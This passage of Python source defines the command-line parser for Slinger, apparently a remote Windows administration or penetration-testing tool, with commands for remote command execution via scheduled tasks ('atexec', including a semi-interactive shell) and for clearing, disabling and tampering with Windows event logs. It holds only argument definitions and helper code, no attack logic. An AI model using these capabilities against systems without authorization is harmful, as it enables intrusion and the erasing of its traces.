        epilog="Example Usage: counter -c 123 [-a x86]",
    )
    parser_getCounter.add_argument(
        "-c", "--counter", help="Specify the counter to display", default=None, type=int
    )
    parser_getCounter.add_argument(
        "-a",
        "--arch",
        help="Specify the architecture of the remote server (default: %(default)s)",
        choices=["x86", "x64", "unk"],
        default="unk",
    )
    parser_getCounter.add_argument(
        "-i",
        "--interactive",
        help="Run the counter in interactive mode",
        action="store_true",
        default=False,
    )

    parser_getCounter.set_defaults(func=slingerClient.show_perf_counter)

    parser_network = subparsers.add_parser(
        "network",
        help="Display network information",
        description="Display network information on the remote server",
        epilog="Example Usage: network",
    )
    parser_network.add_argument(
        "--tcp", help="Display TCP information", action="store_true", default=False
    )
    parser_network.add_argument(
        "--rdp", help="Display RDP information", action="store_true", default=False
    )
    parser_network.set_defaults(func=slingerClient.show_network_info_handler)

    parser_atexec = subparsers.add_parser(
        "atexec",
        help="Execute a command at a specified time",
        description="Execute a command on the remote server",
        epilog='Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\\\Users\\\\Public\\\\Downloads\\\\ -c ipconfig\nFor multi-word commands: atexec -c "echo hello world" -tn MyTask',
    )
    parser_atexec.add_argument(
        "-c",
        "--command",
        help="Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')",
        required=True,
    )
    parser_atexec.add_argument(
        "-sp",
        "--path",
        help="Specify the folder to save the output file (default: %(default)s)",
        required=True,
        default="\\Users\\Public\\Downloads\\",
    )
    parser_atexec.add_argument(
        "-sn",
        "--save-name",
        help="Specify the name of the output file.  Default is <random 8-10 chars>.txt",
        default=None,
    )
    parser_atexec.add_argument(
        "-tn",
        "--name",
        help="Specify the name of the scheduled task (default: auto-generated)",
        default=None,
    )
    parser_atexec.add_argument(
        "-ta",
        "--author",
        help="Specify the author of the scheduled task (default: %(default)s)",
        default="Slinger",
    )
    parser_atexec.add_argument(
        "-td",
        "--description",
        help="Specify the description of the scheduled task (default: %(default)s)",
        default="Scheduled task created by Slinger",
    )
    parser_atexec.add_argument(
        "-tf",
        "--folder",
        help="Specify the folder to run the task in (default: %(default)s)",
        default="\\Windows",
    )
    parser_atexec.add_argument(
        "-sh",
        "--share",
        help="Specify the share name to connect to (default: %(default)s)",
        default="C$",
    )
    parser_atexec.add_argument(
        "--shell", help="Start a semi-interactive shell", action="store_true", default=False
    )
    parser_atexec.add_argument(
        "-w",
        "--wait",
        help="Seconds to wait for the task to complete (default: %(default)s)",
        type=int,
        default=1,
    )

    parser_atexec.set_defaults(func=slingerClient.atexec_handler)

    parser_reload = subparsers.add_parser(
        "reload",
        help="Reload the current session context (hist file location, plugins, etc)",
        description="Reload the current sessions context",
        epilog="Example Usage: reload",
    )
    parser_plugins = subparsers.add_parser(
        "plugins",
        help="List available plugins",
        description="List available plugins",
        epilog="Example Usage: plugins",
    )

    # Subparser for 'downloads' command (resume download management)
    parser_downloads = subparsers.add_parser(
        "downloads",
        help="Manage resume download states",
        description="Manage resume download states and cleanup",
        epilog="Example Usage: downloads list",
    )
    downloads_subparsers = parser_downloads.add_subparsers(
        dest="downloads_action", help="Downloads management actions"
    )

    # downloads list command
    parser_downloads_list = downloads_subparsers.add_parser(
        "list",
        help="List active resumable downloads",
        description="Display all active resumable downloads with progress",
    )
    parser_downloads_list.set_defaults(func=slingerClient.downloads_list_handler)

    # downloads cleanup command
    parser_downloads_cleanup = downloads_subparsers.add_parser(
        "cleanup",
        help="Clean up download states",
        description="Remove completed, stale, or corrupted download state files",
    )
    parser_downloads_cleanup.add_argument(
        "--max-age",
        type=int,
        default=7,
        help="Remove state files older than N days (default: %(default)s)",
    )
    parser_downloads_cleanup.add_argument(
        "--force", action="store_true", help="Force cleanup without confirmation", default=False
    )
    parser_downloads_cleanup.set_defaults(func=slingerClient.downloads_cleanup_handler)

    # Subparser for 'eventlog' command - Windows Event Log Analysis
    parser_eventlog = subparsers.add_parser(
        "eventlog",
        help="Windows Event Log operations",
        description="Query, monitor, and manage Windows Event Logs via WMI",
        epilog="Example Usage: eventlog query -log System -type Error -count 50",
    )
    eventlog_subparsers = parser_eventlog.add_subparsers(
        dest="eventlog_action", help="Event log actions"
    )

    # eventlog query command
    parser_eventlog_query = eventlog_subparsers.add_parser(
        "query",
        help="Query event log entries",
        description="Query Windows Event Log entries with filtering",
        epilog="Example: eventlog query -log System -type Error -since '2024-01-01'",
    )
    parser_eventlog_query.add_argument(
        "-log", "--log", required=True, help="Event log name (System, Application, Security, etc.)"
    )
    parser_eventlog_query.add_argument("-id", "--id", type=int, help="Specific event ID to filter")
    parser_eventlog_query.add_argument(
        "-type",
        "--level",
        choices=["error", "warning", "information", "success", "failure"],
        help="Event level to filter",
    )
    parser_eventlog_query.add_argument(
        "-since", "--since", help="Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')"
    )
    parser_eventlog_query.add_argument(
        "-count", "--count", type=int, default=100, help="Maximum number of events to return"
    )
    parser_eventlog_query.add_argument("-source", "--source", help="Filter by event source name")
    parser_eventlog_query.add_argument(
        "-format",
        "--format",
        choices=["table", "json", "list", "csv"],
        default="table",
        help="Output format",
    )
    parser_eventlog_query.add_argument("-o", "--output", help="Save output to file")
    parser_eventlog_query.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog list command
    parser_eventlog_list = eventlog_subparsers.add_parser(
        "list",
        help="List available event logs",
        description="List all available event logs on the remote system",
    )
    parser_eventlog_list.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog clear command
    parser_eventlog_clear = eventlog_subparsers.add_parser(
        "clear",
        help="Clear event log",
        description="Clear specified event log (with optional backup)",
        epilog="Example: eventlog clear -log Application --backup /tmp/app_backup.evt",
    )
    parser_eventlog_clear.add_argument(
        "-log", "--log", required=True, help="Event log name to clear"
    )
    parser_eventlog_clear.add_argument("--backup", help="Backup log to file before clearing")
    parser_eventlog_clear.add_argument(
        "--force", action="store_true", help="Clear without backup confirmation"
    )
    parser_eventlog_clear.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog backup command
    parser_eventlog_backup = eventlog_subparsers.add_parser(
        "backup",
        help="Backup event log",
        description="Backup event log to file",
        epilog="Example: eventlog backup -log System -o system_backup.evt",
    )
    parser_eventlog_backup.add_argument(
        "-log", "--log", required=True, help="Event log name to backup"
    )
    parser_eventlog_backup.add_argument(
        "-o", "--output", required=True, help="Output file path for backup"
    )
    parser_eventlog_backup.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog monitor command
    parser_eventlog_monitor = eventlog_subparsers.add_parser(
        "monitor",
        help="Monitor event log in real-time",
        description="Monitor event log for new entries in real-time",
        epilog="Example: eventlog monitor -log Security -timeout 300 -filter 'EventCode=4625'",
    )
    parser_eventlog_monitor.add_argument(
        "-log", "--log", required=True, help="Event log name to monitor"
    )
    parser_eventlog_monitor.add_argument(
        "-timeout", "--timeout", type=int, default=300, help="Monitoring timeout in seconds"
    )
    parser_eventlog_monitor.add_argument(
        "-filter", "--filter", help="WQL filter for events (e.g., 'EventCode=4625')"
    )
    parser_eventlog_monitor.add_argument(
        "--interactive", action="store_true", help="Enable interactive commands during monitoring"
    )
    parser_eventlog_monitor.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog enable command
    parser_eventlog_enable = eventlog_subparsers.add_parser(
        "enable",
        help="Enable event logging",
        description="Enable event logging for specified log",
    )
    parser_eventlog_enable.add_argument(
        "-log", "--log", required=True, help="Event log name to enable"
    )
    parser_eventlog_enable.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog disable command
    parser_eventlog_disable = eventlog_subparsers.add_parser(
        "disable",
        help="Disable event logging",
        description="Disable event logging for specified log",
    )
    parser_eventlog_disable.add_argument(
        "-log", "--log", required=True, help="Event log name to disable"
    )
    parser_eventlog_disable.set_defaults(func=slingerClient.eventlog_handler)

    # eventlog clean command - advanced cleaning with local processing
    parser_eventlog_clean = eventlog_subparsers.add_parser(
        "clean",
        help="Advanced event log cleaning",
        description="Download, clean locally, and re-upload event logs",
        epilog="Example: eventlog clean -log Application -method local --backup",
    )
    parser_eventlog_clean.add_argument(
        "-log", "--log", required=True, help="Event log name to clean"
    )
    parser_eventlog_clean.add_argument(
        "-method",
        "--method",
        choices=["local", "upload"],
        default="local",
        help="Cleaning method: local (download/process/upload) or upload (from existing file)",
    )
    parser_eventlog_clean.add_argument("--backup", help="Backup original log before cleaning")
    parser_eventlog_clean.add_argument(
        "--from",
        dest="from_file",
        help="Upload cleaned log from local file (use with -method upload)",
    )
    parser_eventlog_clean.set_defaults(func=slingerClient.eventlog_handler)

    return parser


# def validate_args(parser, arg_list):
#     try:
#         args = parser.parse_args(arg_list)
#     except InvalidParsing:
#         return False
#     pass


def file_to_slinger_script(file_path):
    script = ""
    with open(file_path, "r") as file:
        script = file.read().splitlines()
    return script


def get_subparser_aliases(command, parser):
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            for name, subparser in action.choices.items():
                if command == name:
                    # Inspect the subparser to find aliases
                    for alias, alias_parser in action.choices.items():
                        if alias != name and alias_parser is subparser:
                            return [
                                alias
                                for alias in action.choices
                                if alias != name and action.choices[alias] is subparser
                            ]
    return []


# Custom Completer class using argparse commands and arguments


def setup_completer(subparsers):
    commands = {}
    for action in subparsers._actions:
        if isinstance(action, argparse._SubParsersAction):
            for cmd, subparser in action.choices.items():
                commands[cmd] = [arg for arg in subparser._option_string_actions.keys()]
    return commands


class CommandCompleter(Completer):
    def __init__(self, commands):
        self.commands = commands

    def get_completions(self, document, complete_event):
        text_before_cursor = document.text_before_cursor.strip()
        words = text_before_cursor.split(" ")
        first_word = words[0]

        # If typing the first word, suggest command names
        if len(words) == 1:
            for command in self.commands.keys():
                if command.startswith(first_word):
                    yield Completion(command, start_position=-len(first_word))
            return

        # If typing subsequent words, suggest flags for the last command
        if first_word in self.commands:
            for flag in self.commands[first_word]:
                if flag.startswith(words[-1]):
                    yield Completion(flag, start_position=-len(words[-1]))


def get_prompt(client, nojoy):
    slinger_emoji = "\U0001F920"
    fire_emoji = "\U0001F525"
    neutral_face_unicode = "\U0001F610"

    if client.is_connected_to_remote_share():
        preamble = slinger_emoji + fire_emoji + " "
        emoji = preamble if not nojoy else "[sl] "
    else:
        preamble = slinger_emoji + " "
        emoji = preamble if not nojoy else "[sl] "

    prompt = f"{emoji}{colors.OKGREEN}({client.host}):\\\\{client.current_path}>{colors.ENDC} "
    return prompt


def merge_parsers(primary_parser, secondary_parser):
    # Transfer arguments
    for action in secondary_parser._actions:
        if not any(a for a in primary_parser._actions if a.dest == action.dest):
            primary_parser._add_action(action)

    # Check if both parsers have subparsers
    primary_subparsers = None
    secondary_subparsers = None

    for action in primary_parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            primary_subparsers = action
            break

    for action in secondary_parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            secondary_subparsers = action
            break

    # If both have subparsers, merge them
    if primary_subparsers and secondary_subparsers:
        for choice, subparser in secondary_subparsers.choices.items():
            primary_subparsers.add_parser(choice, parents=[subparser], add_help=False)

    return primary_parser


# Example usage:
# merged_parser = merge_parsers(parser1, parser2)
